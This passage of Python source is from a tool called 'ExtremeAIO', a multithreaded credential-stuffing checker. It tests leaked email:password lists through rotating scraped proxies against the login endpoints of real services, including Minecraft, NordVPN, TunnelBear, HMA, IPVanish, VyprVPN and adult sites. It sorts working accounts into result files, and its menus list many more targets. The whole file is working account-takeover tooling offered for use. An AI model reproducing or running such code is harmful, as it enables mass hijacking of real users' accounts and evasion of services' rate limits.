    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=Crunchyroll_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1



def Minecraft():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=Minecraft_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def Minecraft_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            request_body = json.dumps({
                'agent': {
                    'name': 'Minecraft',
                    'version': 1    
                },
                    'username': email,
                    'password': password})

            r = sess.post('https://authserver.mojang.com/authenticate', data= request_body)
            if "accessToken" in r.text:
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))

                if "name" in r.text:
                    name = r.json()["availableProfiles"][0]["name"]
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/premium.txt".format(today), "a+").write("{}:{} | name: {}\n".format(email, password, name))

                else:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/free.txt".format(today), "a+").write("{}:{}\n".format(email, password))

            elif "Invalid credentials. Invalid username or password." in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

    except Exception:
        errors+=1
        pass
def BangBros():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=BangBros_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def BangBros_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            url = "http://members.bangbros.com/login"

            headers = {
            "Content-Type":"application/x-www-form-urlencoded", 
            "Accept":"*/*",
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
            "Pragma":"no-cache" 
            }

            content = ""

            r = sess.get(url, data=content, headers=headers)
            csrf = search(r'login__token\" name=\"login[_token]\" value=\"(.*?)\" /></form>', str(r.text)).group(1)

            us = f"login%5Busername%5D={email}&login%5Bpassword%5D={password}&profiler_input=&login%5BioBB%5D%5BioBB%5D=&login%5B_token%5D={csrf}"

            head = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "Cookies":"device_view: full", 
                "Accept":"*/*", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                "Pragma":"no-cache" 
            }

            r = sess.post("http://members.bangbros.com/login_check", headers=head, data=content)
            if "No thanks, take me to the site" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            elif "Wrong username/password!" or "Login error has occured.  Please contact customer support" or "UNLOCK OUR ENTIRE LIBRARY OF WEBSITES." in  r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

    except Exception:
        errors+=1
        pass
def Propertysex():
    print("This option is off..")
    time.sleep(2)
    menu()
# VPN

def TunnelBear_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Pragma": "no-cache",
                "Accept": "*/*",
                "origin": "https://www.tunnelbear.com",
                "referer": "https://www.tunnelbear.com/account/login"
            }

            data = {
                "username": email, 
                "password": password, 
                "withUserDetails": "true", 
                "v": "web-1.0"
            }
            r = sess.post("https://www.tunnelbear.com/core/api/login", data=data, headers=headers)
            if "Access denied" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))

            elif "result\":\"PASS\",\"" or "\",\"paymentStatus\":\"FREE" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))

            elif "Rate limiting" in r.text:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

    except Exception:
        errors+=1
        pass
def TunnelBear():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=TunnelBear_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def NordVPN_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            url = "https://zwyr157wwiu6eior.com/v1/users/tokens" 
            headers = {
                "content-type": "application/x-www-form-urlencoded" ,
                "User-Agent": "NordApp android (playstore/2.8.6) Android 9.0.0",
                "Accept": "*/*",
                "Pragma": "no-cache" 
            }
            content = f"username={email}&password={password}" 
            r = sess.post(url, headers=headers, data=content)
            if "\"Unauthorized\"" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))

            elif "\"user_id\"" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            elif "{\"$type\":\"System.Collections.Generic.List`1[[RuriLib.BlockBase, RuriLib]], mscorlib\",\"$values\":[{\"$type\":\"RuriLib.BlockRequest, RuriLib\",\"Url\":\"https://zwyr157wwiu6eior.com/v1/users/tokens\",\"RequestType\":0,\"AuthUser\":\"\",\"AuthPass\":\"\",\"PostData\":\"username=<USER>&password=<PASS>\",\"Method\":3,\"CustomHeaders\":{\"$type\":\"System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib\",\"User-Agent\":\"NordApp android (playstore/2.8.6) Android 8.1.0\",\"Pragma\":\"no-cache\",\"Accept\":\"*/*\"},\"CustomCookies\":{\"$type\":\"System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib\"},\"ContentType\":\"application/x-www-form-urlencoded\",\"AutoRedirect\":true,\"ReadResponseSource\":true,\"ParseQuery\":false,\"EncodeContent\":false,\"AcceptEncoding\":true,\"MultipartBoundary\":\"\",\"MultipartContents\":{\"$type\":\"System.Collections.Generic.List`1[[RuriLib.MultipartContent, RuriLib]], mscorlib\",\"$values\":[]},\"ResponseType\":0,\"DownloadPath\":\"\",\"Label\":\"REQUEST\",\"Disabled\":false}]}" in r.text:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
    except Exception:
        errors+=1
        pass
def NordVPN():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=NordVPN_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def HMA():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=HMA_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def HMA_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            url = "https://securenetconnection.com/clapi/v1.5/user/login" 
            content = f"username={email}&password={password}" 
            headers = {
                "content-type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Pragma": "no-cache",
                "Accept": "*/*" 
            }
            r = sess.post(url, headers=headers, data=content)
            if "{\"status\":{\"code\":257,\"msg\":\"Invalid username/password combination\"}}" in r.text:
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                bad+=1
                cpm+=1
                checked+=1
            elif "\"plan\":\"12 Months\""  in r.text:
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                good+=1
                cpm+=1
                checked+=1
            elif "\"plan\":\"6 Months\""  in r.text:
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                good+=1
                cpm+=1
                checked+=1
            elif "Error has occurred"  in r.text:
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                banned+=1
                cpm+=1
                checked+=1
            elif "\"plan\":\"\""  in r.text:
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))

                good+=1
                cpm+=1
                checked+=1
            else:
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

                banned+=1
                cpm+=1
                checked+=1
    except Exception:
        errors+=1
        pass

def IpVanish_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            content = f"username={email}&password={password}&webLogin=Login" 
            headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "Accept":"*/*", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                "Pragma":"no-cache" 
            }

            r = sess.post("https://account.ipvanish.com/index.php", data=content, headers=headers, allow_redirects=True)
            if "Sorry, invalid credentials." or "reactivate your service" in r.text:
                bad+=1
                checked+=1
                cpm+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))

            elif "Account Status:" in r.text:
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))

                good+=1
                checked+=1
                cpm+=1
            else:
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

                banned+=1
                checked+=1
                cpm+=1
    except Exception:
        errors+=1
        pass
def IpVanish():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=IpVanish_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def VyprVPN_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            url = "https://api.goldenfrog.com/settings" 
            headers = {
                "Host": "api.goldenfrog.com",
                "X-GF-PLATFORM-VERSION": "12.0.1",
                "X-API-Features": "partial_sign_up;",
                "X-GF-PRODUCT": "VyprVPN",
                "Accept": "*/*",
                "X-GF-PLATFORM": "iOS",
                "locale": "de_DE",
                "X-GF-DEVICE-NAME": "iPhone",
                "password": f"{password}",
                "X-API-Version": "2",
                "username": f"{email}",
                "User-Agent": "VyprVPN/7327 CFNetwork/974.2.1 Darwin/18.0.0",
                "Connection": "keep-alive",
                "X-GF-PRODUCT-VERSION": "3.0.0.7327",
                "X-GF-Agent": "VyprVPN iOS 3.0.0.7327 (21a2ef40)" 
            }
            r = sess.get(url, headers=headers)
            if "confirmed\": true" in r.text:
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))

                good+=1
                checked+=1
                cpm+=1
            elif "invalid username or password" in r.text:
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))

                bad+=1
                checked+=1
                cpm+=1
            else:
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

                banned+=1
                checked+=1
                cpm+=1
    except Exception:
        errors+=1
def VyprVPN():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=VyprVPN_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def ZenmateVPN():
    print("This option is off..")
    time.sleep(2)
    menu()

def modules_names():
    global username, module
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print(" Hello, where do you want to go?\n")
    print(f" [{Fore.GREEN}1{Fore.WHITE}] Gaming\n [{Fore.GREEN}2{Fore.WHITE}] Streaming\n [{Fore.GREEN}3{Fore.WHITE}] Porn\n [{Fore.GREEN}4{Fore.WHITE}] Vpn\n [{Fore.GREEN}5{Fore.WHITE}] Mail Access\n [{Fore.GREEN}Q{Fore.WHITE}] Menu")
    alegere = input(" ")
    if alegere == "1": 
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
        print("\n" + logo + "\n")
        print("                                     ExtremeAIO - \"{}\"".format(mesaje))
        print(f" [{Fore.GREEN}1{Fore.WHITE}] uPlay [OFF]\n [{Fore.GREEN}2{Fore.WHITE}] Origin\n [{Fore.GREEN}3{Fore.WHITE}] Valorant\n [{Fore.GREEN}4{Fore.WHITE}] Minecraft\n [{Fore.GREEN}Q{Fore.WHITE}] Menu") 
        alegere_game = input(" ") 
        if alegere_game == "1": 
            load_accounts()
            load_proxies()
            uPlay()
            module = "uPlay"
        elif alegere_game == "2": 
            load_accounts()
            load_proxies()
            Origin() 
            module = "Origin"
        elif alegere_game == "3": 
            load_accounts()
            load_proxies()
            Valorant() 
            module = "Valorant"
        elif alegere_game == "4": 
            load_accounts()
            load_proxies()
            Minecraft()
            module = "Minecraft"
        elif alegere_game.lower() == "q": 
            menu() 
        else: 
            print(" Invalid input..") 
            time.sleep(2) 
            modules_names()
    elif alegere == "2":
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
        print("\n" + logo + "\n")
        print("                                     ExtremeAIO - \"{}\"".format(mesaje))
        print(f" [{Fore.GREEN}1{Fore.WHITE}] Disney+ [OFF]\n [{Fore.GREEN}2{Fore.WHITE}] Crunchyroll\n [{Fore.GREEN}3{Fore.WHITE}] Spotify\n [{Fore.GREEN}4{Fore.WHITE}] Funimation\n [{Fore.GREEN}5{Fore.WHITE}] WWE\n [{Fore.GREEN}6{Fore.WHITE}] NBA\n [{Fore.GREEN}7{Fore.WHITE}] Hulu\n [{Fore.GREEN}8{Fore.WHITE}] HBONow\n [{Fore.GREEN}9{Fore.WHITE}] DAZN\n [{Fore.GREEN}Q{Fore.WHITE}] Menu") 
        alegere_streaming = input(" ") 
        if alegere_streaming == "1": 
            load_accounts()
            load_proxies()
            Disney() 
            module = "Disney+"
        elif alegere_streaming == "2": 
            load_accounts()
            load_proxies()
            Crunchyroll() 
            module = "Crunchyroll"
        elif alegere_streaming == "3": 
            load_accounts()
            load_proxies()
            Spotify() 
            module = "Spotify"
        elif alegere_streaming == "4": 
            load_accounts()
            load_proxies()
            Funimation() 
            module = "Funimation"
        elif alegere_streaming == "5": 
            load_accounts()
            load_proxies()
            WWE() 
            module = "WWE"
        elif alegere_streaming == "6": 
            load_accounts()
            load_proxies()
            NBA()
            module = "NBA" 
        elif alegere_streaming == "7": 
            load_accounts()
            load_proxies()
            Hulu()
            module = "Hulu"
        elif alegere_streaming == "8": 
            load_accounts()
            load_proxies()
            HBONow()
            module = "HBONow"
        elif alegere_streaming == "9": 
            load_accounts()
            load_proxies()
            DAZN()
            module = "DAZN"
        elif alegere_streaming.lower() == "q": 
            menu() 
        else: 
            print(" Invalid input..") 
            time.sleep(2) 
            modules_names()  

    elif alegere == "3":
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
        print("\n" + logo + "\n")
        print("                                     ExtremeAIO - \"{}\"".format(mesaje))
        print(f" [{Fore.GREEN}1{Fore.WHITE}] The HUB [OFF]\n [{Fore.GREEN}2{Fore.WHITE}] Propertysex [OFF]\n [{Fore.GREEN}3{Fore.WHITE}] BangBros\n [{Fore.GREEN}4{Fore.WHITE}] RealityKings\n [{Fore.GREEN}5{Fore.WHITE}] Brazzers\n [{Fore.GREEN}6{Fore.WHITE}] PornPORTAL\n [{Fore.GREEN}Q{Fore.WHITE}] Menu") 
        alegere_streaming = input(" ") 
        if alegere_streaming == "1": 
            modules_names()
        elif alegere_streaming == "2": 
            modules_names()
        elif alegere_streaming == "3": 
            load_accounts()
            load_proxies()
            BangBros()
            module = "BangBros"
        elif alegere_streaming == "4": 
            load_accounts()
            load_proxies()
            RealityKings()
            module = "RealityKings"
        elif alegere_streaming == "5": 
            load_accounts()
            load_proxies()
            Brazzers()
            module = "Brazzers"
        elif alegere_streaming == "6": 
            load_accounts()
            load_proxies()
            PornPORTAL()
            module = "PornPORTAL"
        elif alegere_streaming.lower() == "q": 
            menu()
        else: 
            print(" Invalid input..") 
            time.sleep(2) 
            modules_names()  
    elif alegere == "4":
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
        print("\n" + logo + "\n")
        print("                                     ExtremeAIO - \"{}\"".format(mesaje))
        print(f" [{Fore.GREEN}1{Fore.WHITE}] TunnelBear\n [{Fore.GREEN}2{Fore.WHITE}] NordVPN\n [{Fore.GREEN}3{Fore.WHITE}] HMA\n [{Fore.GREEN}4{Fore.WHITE}] IpVanish\n [{Fore.GREEN}5{Fore.WHITE}] VyprVPN\n [{Fore.GREEN}6{Fore.WHITE}] X-VPN\n [{Fore.GREEN}Q{Fore.WHITE}] Menu") 
        alegere_streaming = input(" ") 
        if alegere_streaming == "1": 
            load_accounts()
            load_proxies()
            TunnelBear() 
            module = "TunnelBear"
        elif alegere_streaming == "2": 
            load_accounts()
            load_proxies()
            NordVPN()  
            module = "NordVPN"
        elif alegere_streaming == "3": 
            load_accounts()
            load_proxies()
            HMA() 
            module = "HMA"
        elif alegere_streaming == "4": 
            load_accounts()
            load_proxies()
            IpVanish() 
            module = "IpVanish"
        elif alegere_streaming == "5": 
            load_accounts()
            load_proxies()
            VyprVPN()
            module = "VyprVPN"
        elif alegere_streaming == "6":
            load_accounts()
            load_proxies()
            XVPN() 
            module = "X-VPN"
        elif alegere_streaming.lower() == "q":
            menu()
        else: 
            print(" Invalid input..") 
            time.sleep(2) 
            modules_names()  
    elif alegere == "5":
        load_accounts()
        load_proxies()
        Mail_Access() 
    elif alegere.lower() == "q":
        menu()
def proxy_scraper_mesaj():
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print()
    print(logo)
    print()
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print("  What type of proxies you want to use?")
    print()
    print(f"  [{Fore.GREEN}1{Fore.WHITE}] Http/s")
    print(f"  [{Fore.GREEN}1{Fore.WHITE}] Socks4")
    print(f"  [{Fore.GREEN}3{Fore.WHITE}] Socks5")
    print(f"  [{Fore.GREEN}4{Fore.WHITE}] All Types")
    print(f"  [{Fore.GREEN}5{Fore.WHITE}] Menu")
    alegere_scraper = input("  ")
    if alegere_scraper == "1":
        open("https.txt", "a")
        httpsproxies = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all")
        with open("https.txt", "w+") as f:
            f.write(str(httpsproxies.text))
            f.close()
        proxy_scraper_mesaj()
    elif alegere_scraper == "2":
        open("socks4.txt", "a")
        socks4proxies = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=10000&country=all&ssl=all&anonymity=all")
        with open("socks4.txt", "w+") as f:
            f.write(str(socks4proxies.text))
            f.close()
        proxy_scraper_mesaj()
    elif alegere_scraper == "3":
        open("socks5.txt", "a")
        socks5proxies = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all&ssl=all&anonymity=all")
        with open("socks5.txt", "w+") as f:
            f.write(str(socks5proxies.text))
            f.close()
        proxy_scraper_mesaj()
    elif alegere_scraper == "4":
        open("alltypes.txt", "a")
        alltypes = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=all&timeout=10000&country=all&ssl=all&anonymity=all")
        with open("alltypes.txt", "w+") as f:
            f.write(str(alltypes.text))
            f.close()
        proxy_scraper_mesaj()
    elif alegere_scraper == "5":
        menu()
    else:
        print("  Invalid input..")
        time.sleep(1)
        sys.exit()
def menu():
    global username
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print()
    print(logo)
    print()
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello {}, where do you want to go?".format(username))
    print()
    print(f" [{Fore.GREEN}1{Fore.WHITE}] Modules")
    print(f" [{Fore.GREEN}2{Fore.WHITE}] Scraper")
    print(f" [{Fore.GREEN}3{Fore.WHITE}] Support")
    alegere_menu = input(" ")
    if alegere_menu == "1":
        modules_names()
    elif alegere_menu == "2":
        proxy_scraper_mesaj()
    elif alegere_menu == "3":
        webbrowser.open_new(contact_us)
        menu()
    else:
        print(" Invalid input.. ")
        time.sleep(2)
        menu()


if ByPassLogin:
    menu()
else:
    logincheck()
